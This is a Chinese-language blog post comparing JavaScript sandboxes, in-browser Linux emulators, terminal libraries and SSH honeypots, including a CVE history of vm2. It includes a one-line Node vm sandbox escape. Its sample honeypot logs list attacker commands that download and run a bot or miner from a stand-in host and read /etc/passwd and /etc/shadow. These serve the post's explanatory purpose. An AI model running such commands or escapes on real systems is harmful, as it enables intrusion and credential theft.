---
title: 每种 JavaScript 沙箱、模拟器、仿真器和 Linux 蜜罐，对比
description: JavaScript/TypeScript 重建 Linux 环境方案的深入分析。
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "JmBLgqcwwrnQMyxT4pTkQun2Tx0ZLHe5c6QK8IADBbXu/H5molHTbf4QQrMkIObSG31KhlOI1yaZEWyFNz3kVg=="
---

# 每种 JavaScript 沙箱、模拟器、仿真器和 Linux 蜜罐，对比

好吧，我在这个兔子洞里已经走太远了。一切起因是我在帮 [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)，Fortune 的项目（后面细说），老被问"等等，这和 `v86` 什么区别？"或"为什么不用 `vm2`？"，我发现不先把整个生态画出来，根本答不清楚。所以就有了这篇。坐长了，来杯咖啡，真的。或两杯。

结果有四个完全不同的家族，JS 沙箱、Linux 模拟器、Linux 仿真器、蜜罐，几乎不重叠，虽然老被放一句话里。做插件系统的人用 `isolated-vm`。做 CLI 工具演示的人用 `v86`。做 SSH 威胁情报的人用 Cowrie。解决的问题完全不同，共用"把代码关进盒子跑"这顶大帽子。

我为这篇读了大量源码、CVE 报告、架构文档、npm 页面。会很长，咖啡备好。真的。

> 小声明：`typescript-virtual-container` 在这篇戏份重，因为是它逼我做的调研。别的我尽量公允，但这层上下文先摆出来。

---

## 第 0 部分，先问你到底解决什么问题

开挖前先把每个家族管什么说清，术语很快变糊，大家老混着说（我画全图前也混）。

**JS 沙箱**把 JavaScript 代码和宿主 Node.js 进程隔开。威胁模型是：不可信 JS 代码可能调 `process.exit()`、读文件、起子进程。解法是在 V8 执行周围画边界。这些东西没有 Linux shell、没有带权限的文件系统、没有 SSH 的概念。

**Linux 模拟器**在 JavaScript 或 WebAssembly 实现的 CPU 模拟器（x86、RISC-V、OR1K）里跑未经修改的真 Linux 内核。起真 OS。真系统调用。编译给 x86 的二进制兼容跑。资源代价巨大。

**Linux 仿真器**模仿 Linux 系统的*行为*，不跑真内核。实现 shell 解释器、虚拟文件系统、够骗过程序和人的 Unix 语义。无内核，无 Wasm，无 CPU 模拟。资源少得多。

**蜜罐**为被攻击而生，记录攻击者干什么。主要不是执行环境，是观测工具。像不像真 Linux 只在"攻击者识不识破"这个意义上重要。

按这个框，这篇每个项目坐哪：

```
JS 沙箱：      vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux 模拟器：  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux 仿真器：  typescript-virtual-container（这块独一家）
蜜罐：         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
终端栈：       xterm.js + node-pty（不是隔离器，但相关）
```

---

## 第 1 部分，JavaScript 沙箱

### 1.1 `vm`，Node.js 原生模块（和你想的不一样）

Node 里"跑不可信 JS"最老的答案是原生 `vm` 模块。从 v0.1 就在，很多人第一个用它，然后被坑。

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm` 真干的事：建新 V8 上下文（一套新原生构造器，`Object`、`Array`、`Function` 等），代码里面跑，共享你塞进 `sandbox` 的引用。V8 引擎没变。进程没变。内存共享。

`vm` 为什么零安全：JavaScript 原型链是 DAG 连着一切到 `Object.prototype`。宿主世界对象一进沙箱，客人顺原型链爬到宿主构造器。从 `Function` 出发，`Function("return process")()` 拿真 `process`。游戏结束。就地结束。

```js
// vm 里这样完全跑得通，拿真 process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

我说真的，Node.js 文档自己写："vm 模块不是安全机制。不要拿它跑不可信代码。"这警告一直都在。人们一直无视。我见过生产应用拿 `vm` 当沙箱。求你了别这么干。

**结论**：作用域机制，不是沙箱。隔离变量用（模板引擎、`eval` 类功能但代码你可控）。不可信输入永远别用。

**内存**：可忽略开销，和宿主进程同一 V8 堆。
**安全**：对有动机的攻击者零。

---

### 1.2 `vm2`，社区尝试，和它漫长的死亡

`vm2` 是社区对 `vm` 逃逸的回答。核心思路：跨沙箱边界的每个对象包 `Proxy`，拦截属性访问，断原型链，过滤危险引用。思路聪明！实际结果嘛，如下所示，远没那么好看。

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // 抛 VMError，process 够不着
```

好几年跑得不错。但 JavaScript `Proxy` 攻击面巨大。JS 语言每个新特性，生成器、异步迭代器、`Symbol.toPrimitive`、`Error.prepareStackTrace`、Promise 内部槽，都是潜在绕过向量。

CVE 年表有点……你自己看：

| 日期 | CVE | 手法 |
|------|-----|-----------|
| 2022 年 10 月 | CVE-2022-36067 | 经 `Error.prepareStackTrace` 逃宿主上下文 |
| 2023 年 4 月 | CVE-2023-29017 | 未处理异步错误漏宿主对象 |
| 2023 年 4 月 | CVE-2023-29199 | 经 `handleException()` 绕异常清洗 |
| 2023 年 4 月 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| 2023 年 5 月 | CVE-2023-32314 | `Error.name` 上 `Proxy` → `Function` → RCE |
| 2023 年 7 月 | CVE-2023-37466 | 异步函数加栈溢出加 `Proxy.getPrototypeOf` |
| 2023 年 7 月 | CVE-2023-37903 | Worker 线程加 eval 逃逸 |

2023 年 4 月一个月三个严重 CVE。三！个！一！个！月！CVE-2023-37903 之后维护者正式弃坑，原话：*"库有严重安全问题，生产别用。"*

维护者 2025 年 10 月带着 3.10.0 复活，称当时已知的全修了。2026 年 1 月披露新的严重逃逸（CVE-2026-22709，CVSS 9.8），2026 年 5 月又来一批十一个。十一个。模式没变，我觉得永远不会变。

根本问题是架构性的，也是整个生态花一阵才学会的教训。同语言、同引擎、同进程里建的安全沙箱，盖不住。逃逸面是整个 V8 实现，几百万行 C++，天天变。JS 每个新特性都可能开新攻击路。

**结论**：安全敏感别用。最新版也一样，绕过几个月出一个。维护者自己都公开认了。

---

### 1.3 `isolated-vm`，真管用的那个

`isolated-vm` 路子对：用 V8 原生隔离原语 Isolate。每个 V8 Isolate 独立堆、独立 GC、独立原生件、和其他 Isolate 零共享引用。

Chrome 标签页之间就是这条边界。真安全屏障，不是语言层 Proxy 小把戏。

```js
import ivm from "isolated-vm";

// 每个 isolate 是独立 V8 堆
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // 上限 MB
const context = await isolate.createContext();
const jail = context.global;

// 过边界数据显式序列化
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // 够不着宿主进程、宿主堆、宿主模块
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// 超时或超内存硬杀
isolate.dispose(); // 整堆释放
```

`Reference` 和 `ExternalCopy` 类型是显式通信桥。`Reference` 给 isolate 可调用宿主函数的 handle，isolate 能调不能看它闭包或原型。`ExternalCopy` 跨堆边界序列化值（结构化克隆）。显式桥不好用，但是隔离真的原因。

资源上限能收紧：内存（超了杀 isolate）、墙钟超时、CPU 超时。杀是真杀，杀整个 V8 Isolate，不是可以 `while(true)` 绕的 JS 超时。

**局限**：只管 JS。里面跑不了 bash。没有文件、权限、网络、进程概念。用户提交 JS（插件、公式、脚本钩子）完美，别的一概不行。`typescript-virtual-container` 作者说当初考虑过，才发现"隔离 JavaScript"和"跑 shell 命令"是根本不同的两个问题。

**内存**：空 isolate 约 3-10M，随堆用涨。
**安全**：稳。V8 Isolate 边界是真隔离原语。
**npm**：[isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**：[laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`，Wasm 里跑另一个 JS 引擎

换思路：不在 V8 里隔离，跑 Wasm 编译的完全独立 JS 引擎。宿主跑 V8/Node。客人跑 Wasm 里的 QuickJS。Wasm 沙箱给隔离边界。

QuickJS 还是 Fabrice Bellard 的作品（QEMU、FFmpeg、JSLinux、TinyEMU 全他写的，这人不是真的吧，一个人怎么干这么多）。小 ES2023 合规 JS 引擎，C 写的，编进 Wasm 约 500K。

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // 跑在 QuickJS，和 V8 完全隔离
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS 是 ES2023 合规小 JS 引擎，C 写的。编 Wasm 同步版约 500K，异步版（Asyncify）约 1M。内存管理手动，从 VM 拿的每个值显式释放，有点烦但杜绝跨边界 GC 惊喜。trade-off 挺逗！

`@sebastianwessel/quickjs` wrapper 在上面包了更顺手的 API，可选虚拟文件系统、fetch、Node.js 模块 stub：

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

安全模型和 `isolated-vm` 不同：Wasm 线性内存模型让客人直接够不着宿主 V8 堆对象。攻击面是宿主↔Wasm 接口（导入导出），不是整个 JS 语言。一般认为比 Proxy 沙箱稳。

代价：QuickJS 优化比 V8 差远。JS 纯 CPU 活慢 5 到 20 倍。小代码和不可信求值一般无所谓。

**内存**：Wasm 模块约 500K 加每实例堆。
**安全**：Wasm 边界，一般认为比 Proxy 强。
**npm**：[quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten)、[@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**：[justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno，权限优先的运行时

Deno 哲学完全不同：不在 Node 里做沙箱，造默认安全的新运行时。我真喜欢这思路，这才是 Node.js 当初该有的样子，真的。Ryan Dahl（Node.js 原作者）字面因为后悔 Node.js 几个设计决定造了 Deno，想想多疯。

每个敏感能力（读文件、写文件、网络、环境、子进程）要显式 `--allow-*` flag：

```bash
# 只能读 /data，别的不行
deno run --allow-read=/data script.ts

# 只能访问一个域名
deno run --allow-net=api.example.com script.ts

# 没 flag 就没权限
deno run untrusted.ts # 不能读、不能写、不能网、不能起
```

权限模型实现在 Rust/OS 层，不是 JS 小把戏。Deno 代码调 `Deno.readFile()`，过 Rust 操作先查权限表再碰文件系统。JS 层绕不过，因为没权限系统调用根本不发生。

跑真不可信代码，Deno Worker（Web Worker）给同进程第二个 isolate，各带权限集。零权限 worker 起一个，`postMessage` 通信。

Deno 2（2024 年 10 月）加完整 npm 兼容和 Node.js 兼容垫片，服务端采用多多了。

**trade-off**：Deno 安全模型对"半信"代码极好。对完全不可信、可能怀恶意的代码，权限模型不够，要 Isolate 边界（`isolated-vm`）或换引擎（`quickjs-emscripten`），因为 Deno 还是 V8， sophistication 攻击者能找 V8 层 bug。

---

### 1.6 TC39 ShadowRealm，标准答案（以后）

JS 标准组织（TC39）有个 ShadowRealm 提案，想把 `vm` 和 `vm2` 要干的事标准化，但安全模型做对。ShadowRealm 建隔离 JS 执行上下文，自带内建件，够不着外部 realm，导入导出接口严格管。

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // 独立内建件，够不着外部 realm
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm 浏览器有了（Chrome 90+、Firefox 105+），2026 年 Node.js 稳定版还没有。TC39 Compartments 提案在上面做模块级隔离。长期标准答案，但服务端生产还没到。看得见来，但……就是还没到。经典 TC39。

---

### 沙箱家族总结

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **隔离边界** | 无（作用域） | Proxy（破了） | V8 Isolate | Wasm | V8 Isolate 加 Rust 权限 |
| **内存上限** | ❌ | ❌ | ✅ 硬上限 | ✅ Wasm 堆 | 部分 |
| **CPU 超时** | ❌ | ✅（可绕） | ✅ 硬 | ✅ | ✅ |
| **安全** | 无 | 破 | 稳 | 稳 | 稳 |
| **JS 速度** | V8 原生 | V8 原生 | V8 原生 | 约慢 10 倍 | V8 原生 |
| **浏览器** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node 兼容** | 原生 | ✅ | ✅ | 部分垫片 | 部分 |
| **状态** | 稳定 | 危险（新 CVE 不断） | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |
| **内存开销** | 约 1M | 约 5-20M | 约 3-10M | 约 5-15M | 约 10-30M |

结论：安全要紧，真选项只有两个，`isolated-vm`（原生扩展，V8 Isolate，全速 JS）和 `quickjs-emscripten`（Wasm，兼容浏览器，重算慢约 10 倍）。剩下要么"求你别"（`vm`、`vm2`），要么解决完全别的问题的运行时（Deno）。ShadowRealm 以后可能改命，但不是现在。
---

## 第 2 部分，JavaScript 里的 Linux 模拟器

这里开始对我是真有意思的部分。全是*真*模拟器，在 JavaScript 或 WebAssembly 实现的 CPU 指令集里起真 Linux 内核镜像，跑真用户态二进制。隔离来自客人宿主零共享：不同内存空间，不同指令流。

代价巨大，得到的东西也真离谱：真 Linux，真跑，在你浏览器或 Node 进程里。想想多疯，对吧？

### 2.1 `v86`，JS 加 Wasm JIT 的 x86 PC 模拟器

`v86` 是 copy（GitHub 上）在 JavaScript 里最能打的开源 x86 模拟器。2013 年左右纯 JS 解释器起家，进化到 x86 基本块 JIT 翻 WebAssembly，性能涨一大截。

模拟什么：
- **CPU**：x86-32（IA-32），指令集约 Pentium 1 水平。64 位（x86-64）没有，这是硬件架构限制，不是缺功能。
- **FPU**：走 JavaScript `Float64Array`。x87 是 80 位扩展精度，JS double 64 位。浮点结果和真 CPU 差一点。
- **内存**：可配，映射到 JS 堆 `SharedArrayBuffer` 或 `ArrayBuffer`。
- **硬件**：8254 PIT（定时）、8259 PIC（中断控制）、8042 键盘控制（PS/2）、CMOS RTC、VGA 加 SVGA 和 Bochs VBE 扩展、IDE 控制、软盘控制（8272A）、NE2000 网卡。
- **BIOS**：SeaBIOS（开源 x86 BIOS）。

JIT 干活：识别基本块（无跳转指令序列），翻成 WebAssembly 函数，缓存，下次跑同块直接调。热路径跑原生 Wasm 性能。冷路径回 JS 解释器。

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128M
  autostart: true,
});

// 抓串口输出（Linux 内核日志）
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// 往客人送输入（在 shell 敲字）
emulator.serial0_send("ls /\n");
```

**支持 OS**：Alpine Linux（极好）、Ubuntu 16.04/18.04（只 i386）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（凑合）、MS-DOS。

**启动时间**：干净 Alpine 镜像 15-40 秒。真内核初始化，跳不过。对，用户看 Linux 内核在浏览器启动。就这 deal。

**最小内存**：每实例 100-256M。忙 Linux 实例光 Wasm JIT 代码缓存几十 M。

**Node.js 用**：全支持。DOM 不需要，只关心串口输出 VGA 扔了就行。

**干不了**：64 位二进制、现代内核功能（eBPF、io_uring 等）、同时跑一把实例不碰内存墙。

**npm**：[v86](https://www.npmjs.com/package/v86)，持续更新，我写时当天刚发版。
**GitHub**：[copy/v86](https://github.com/copy/v86)
**演示**：[copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux 和 TinyEMU，Bellard 的活，分两次

JSLinux 是 Fabrice Bellard 的 JavaScript Linux 模拟器，2011 年首发，全场第一个。我这篇老提 Bellard 因为他老出现：QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。这人离谱，真的是软件史上个人技术贡献最离谱的之一，不夸张。

最早 JSLinux 是纯 JS x86 解释器。2016 年 Bellard 写 TinyEMU（C 写的 RISC-V 模拟器），Emscripten 编 JavaScript，成了现在 JSLinux 底座。所以现在 JSLinux 是 C 生成的 JavaScript，一行手写 JS 没有。

Bellard 站上的技术笔记值得读：现在 JSLinux 跑 32 或 64 位 RISC-V CPU（不是 x86），VirtIO 串口控制台、网络、块设备、9P 文件系统和宿主共享文件。JS 演示从 C 经 Emscripten 编，不手写 JS。

TinyEMU 自己支持：
- RISC-V RV32IMAFDQC 和 RV64IMAFDQC（32 和 64 位，浮点、乘法、压缩指令）
- x86 经 KVM（只原生，不是模拟，所以 JS 版只 RISC-V）
- VirtIO 控制台、网络、块、输入、9P 文件系统

TinyEMU 有经 Emscripten 的 JavaScript 演示。JSLinux 底座是它，`container2wasm` 也用它（2.5 节）。

**JSLinux 状态**：没 npm 包，没可编程 API。浏览器打开的演示。历史意义大，库实用价值零。

**TinyEMU**：没 npm，C 源码在 [bellard.org/tinyemu](https://bellard.org/tinyemu/)。

---

### 2.3 jor1k，OR1K 模拟器

jor1k 是 Sebastian Macke 写的 JavaScript OpenRISC 1000（OR1K）模拟器。历史上有意思因为 jor1k 首创 VirtIO 9P 文件系统支持，Bellard 拿去并进 TinyEMU 和 JSLinux。项目之间交叉借东西很密，说实话开源模拟器圈最酷的事之一。

**状态**：不积极维护，没 npm 包。这时候归档了。知道有这东西就行，哪天有人饭桌提 jor1k 你接得上 :)

---

### 2.4 CheerpX，浏览器商用 x86 模拟器

CheerpX 是 Leaning Technologies 的商用生产级 Linux x86 模拟器。不开源，但跑真 Debian/Ubuntu 用户态比 v86 能打得多。浏览器跑真 VSCode 找它。

和 v86 关键区别：
- ISA 更宽（更多 x86 扩展，glibc 兼容更好）
- 文件系统走浏览器 IndexedDB（刷新不丢）
- pthread 经 `SharedArrayBuffer`（要 COOP/COEP 头，对讨厌的安全头）
- 为跑真应用设计：VSCode、Python、Node.js 等，不只最小 OS 镜像
- 有专业支持和 SLA（aka 出事能找人骂）

典型场景"浏览器跑真 Linux 应用，不搭服务器。"拿它做浏览器 IDE、代码教程、交互文档的公司不少。

```js
// CheerpX API（简化）
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js 故事**：首先给浏览器设计。底下模拟器理论 Node 能跑（Wasm 的），但 API 文档全按浏览器用写。服务端用不支持。

**内存**：和 v86 相近，真 Debian 实例 200M 起。
**价格**：开源项目免费，生产 SaaS 商业许可。
**文档**：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers（StackBlitz），Wasm 里的 Node.js，不是 Linux 模拟

WebContainers 老被和 Linux 模拟器放一堆，但架构不同。不模拟 x86。不起 Linux。Node.js 编 WebAssembly 跑 WASI。这区别很大，我为此糊涂超久。

我觉得 confusion 来自营销，"浏览器跑 Node.js"听着像模拟，实际 Node.js 自己编 Wasm，不是模拟 Linux 跑里面 Node.js。两套完全不同的架构。

架构：
1. Node.js 编 Wasm（定制 WASI 运行时专版）
2. Service Worker 拦截模拟 Node 服务器的网络请求，路由回浏览器标签
3. 文件系统在浏览器内存（无磁盘 I/O）
4. npm 是给浏览器优化的定制实现

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// 写文件
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// 跑 Node.js 命令
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

跑真 Node.js（编 Wasm 的），真 npm、真 Node API、真模块解析。没有通用 Linux 用户态，`apt` 装不了系统包，任意编译二进制跑不了，Node.js 生态之外基本干不了啥。

**浏览器前提**：SharedArrayBuffer（要 COOP/COEP 头）、Service Worker 支持、现代 Wasm。

**Node.js 故事**：只给浏览器设计。API 浏览器上下文之外跑不了。

**npm**：[@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**文档**：[webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm，Docker 容器编 Wasm

`container2wasm` 是工具（不是 npm 包），NTT 出的，把 Docker 容器镜像转 WebAssembly 二进制，任何 Wasm 宿主跑，包括浏览器。第一次见我是真不信能跑。

机制：
- x86_64 容器：包 Bochs（x86 模拟器，编 Wasm）加容器 rootfs
- riscv64 容器：包 TinyEMU（又是 Bellard！）加容器 rootfs
- 出来 `.wasm` 起模拟器，挂容器文件系统，跑容器入口

```bash
# Ubuntu 22.04 容器转 Wasm
c2w ubuntu:22.04 out.wasm

# 跑
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# 或 serve 给浏览器用
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

出来 `.wasm` 巨大，最小 Ubuntu 几百 M，但完全自包含。邮件发人 `.wasm` 对方浏览器跑 Ubuntu。这话本不该通顺但现在通了。

**GitHub**：[container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### 模拟器家族总结

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **架构** | x86-32 JIT→Wasm | RISC-V（Wasm） | OR1K（JS） | x86（专有） | Node.js→Wasm/WASI | x86/RISC-V（Wasm） |
| **真内核** | ✅ | ✅ | ✅ | ✅ | ❌（Node.js） | ✅ |
| **64 位** | ❌ | ✅（RISC-V） | ❌ | ✅ | 无 | ✅ |
| **npm 包** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌（CLI 工具） |
| **Node.js 用** | ✅ | ❌ | ❌ | ❌ | ❌（只浏览器） | 经 Wasmtime |
| **浏览器用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **内存/实例** | 150-256M | 约 64-128M | 约 64M | 200M 起 | 约 100M | 约 200-500M |
| **启动** | 15-40 秒 | 10-30 秒 | 10-30 秒 | 15-40 秒 | 2-5 秒 | 10-40 秒 |
| **开源** | ✅ | ✅ | ✅ | ❌ | 部分 | ✅ |
| **状态** | ✅ 很活跃 | ✅ 稳定 | ⚠️ 归档 | ✅ 商用 | ✅ 活跃 | ✅ 活跃 |

这表一眼结论：`v86` 是唯一同时 npm 包、浏览器 Node 通吃、开源的。所以"JavaScript 跑 Linux 模拟器"话题它统治。别的全有短板，JSLinux 没 API，jor1k 归档，CheerpX 收钱，WebContainers 只浏览器只 Node，container2wasm 要构建加 CLI。就要"JavaScript 起 Linux"，`v86` 几乎永远是起点。
---

## 第 3 部分，终端栈：xterm.js 和 node-pty

做类 shell 体验这两个包老出现。不是沙箱不是模拟器，是 UI 和 PTY 管道，但相关到不提难受。而且我两个都用过，都真好用。

### 3.1 `xterm.js`，终端渲染

xterm.js 是浏览器终端模拟器。`<canvas>` 里画终端屏（VT100/xterm 转义序列），管键盘输入，暴露接后端数据的 API。

用它：VS Code 内置终端、Azure Cloud Shell、Proxmox VE、AWS CloudShell 等等。

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// 往终端送数据（显示成字）
term.write("$ ");
term.onData(data => {
  // data 是按键，发后端
  socket.send(data);
});
socket.onmessage(msg => {
  // 后端输出，显示
  term.write(msg.data);
});
```

xterm.js 只管渲染层。不跑 shell。不解释命令。显示 widget，接你选的后端。很多人以为 xterm.js"就是终端"，其实它只是屏幕，跑命令的东西另接。

**npm**：[@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**：[xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`，PTY 创建

`node-pty` 在 Node.js 建伪终端（PTY），给你读写 handle。和 xterm.js 配，浏览器终端连服务器真 shell（bash、zsh、fish）。

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // 经 WebSocket 发浏览器 xterm.js
  ws.send(data);
});

ws.on("message", data => {
  // 浏览器按键传 shell
  shell.write(data);
});
```

云 IDE 和网页终端标准方案：xterm.js（浏览器）↔ WebSocket ↔ node-pty ↔ 真 bash。隔离零。shell 拿 Node.js 进程（或起它用户）全部权限跑。

**维护**：微软。
**npm**：[node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**：[microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## 第 4 部分，SSH 蜜罐

蜜罐为被攻击而生。目标是装够真，攻击者进来玩，顺手全记录。SSH 是头号目标因为它是网上被扫最多的服务，公网 IP 开 22 端口几分钟内见自动扫描。字面几分钟。有天试试，看看来得多快，吓人。

蜜罐质量看两样：**逼真度**（装真系统装多像，攻击者识不识破）和**遥测**（抓多少有用数据）。两样互掐。高逼真难建，跑着风险大。

这节最终逼我给 `typescript-virtual-container` 写 `HoneyPot` 模块，所以我有点 opinions。

### 4.1 Cowrie，标杆

Cowrie 是 Python 写的 SSH 和 Telnet 中高交互蜜罐。研究和安全圈部署最多的 SSH 蜜罐。

架构：
- **协议层**：真 SSH 协议实现（Twisted Conch），攻击者拿到真握手、真密钥交换、真认证
- **shell 层**：假文件系统（长得像 Debian 5.0）加残 shell 解释器，回常见命令
- **代理模式**：后面挂真系统（高交互模式），流量全录
- **LLM 模式**（新加）：调语言模型动态回它不会的命令，对 Cowrie 都有 AI 模式了。疯时代。

```python
# Cowrie 抓什么
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie 存攻击者下的文件（经 wget/curl/SFTP/SCP），做恶意软件分析。接 Splunk、Elasticsearch 等 SIEM。

**逼真度**：中高。骗自动 bot 够了（99% SSH 攻击者就是试 `root`/`password` 的蠢脚本）。老练人类能指纹识破，一般挺快。

**语言**：Python（Twisted）
**GitHub**：[cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo，Cowrie 前身

Kippo 是 Cowrie 基于的原版中交互 SSH 蜜罐。同思路：真 SSH 协议，假文件系统，残 shell。Cowrie 全面超了它，Kippo 归档，2026 年谁都不该用。纯历史完整提一嘴，老博客和安全论文还引用它。

**GitHub**：[desaster/kippo](https://github.com/desaster/kippo)，已归档

---

### 4.3 endlessh，SSH tarpit

endlessh 是退化蜜罐：SSH 连接吊着，banner 一秒一字节（或更慢）慢慢发。连上的客户端永远卡住，到不了认证因为服务器发不完 banner。

目的不是威胁情报，是纯资源拒绝：占攻击者扫描线程，让它们慢点够到真目标。说实话有点损但爽。攻击者啥都学不到，纯烧它时间。莫名解气。

```c
// endlessh 全部协议行为：
// 发："SSH-2.0-OpenSSH_" 然后慢慢加随机字符
// 永不断连接
// 攻击者扫描器 N 秒后超时
```

命令不抓。认证不测。纯耗连接时间。

**语言**：C
**GitHub**：[skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame，"全放行"蜜罐

sshesame 全接受 SSH 连接（任何用户、任何密码、任何密钥），全记录。零交互蜜罐：不回命令，放攻击者"进来"，按键全记。

```
2024-01-15 03:22:11 45.33.32.156 连入
  用户：root，密码：password123，已接受
  敲的命令：
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47 秒后断开
```

收凭证神器：很快攒出 bot 在爆破的用户名密码，知道哪些默认口令正被打。剧透：永远 `root`/`password`、`admin`/`admin`、`root`/`123456`。每次都。

**GitHub**：[jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird，Docker 蜜罐框架

`lyrebird/honeypot-base` 是搭网络服务蜜罐的 Docker 基镜像。不是专门 SSH 蜜罐，是搭任何协议蜜罐的框架。

基镜像给日志框架、协议插件系统、多服务蜜罐 Docker Compose 配置。扩展去仿具体服务。

**Docker Hub**：[lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.js 手搭 SSH 蜜罐，天真版，和它为什么挂

`typescript-virtual-container` 之前，Node.js 搭 SSH 蜜罐就是真 `ssh2` 库加手写命令模拟。又累又残又不全，但……必经之路，这时候：

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // 记尝试
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // 全放行
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // 模拟回复
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

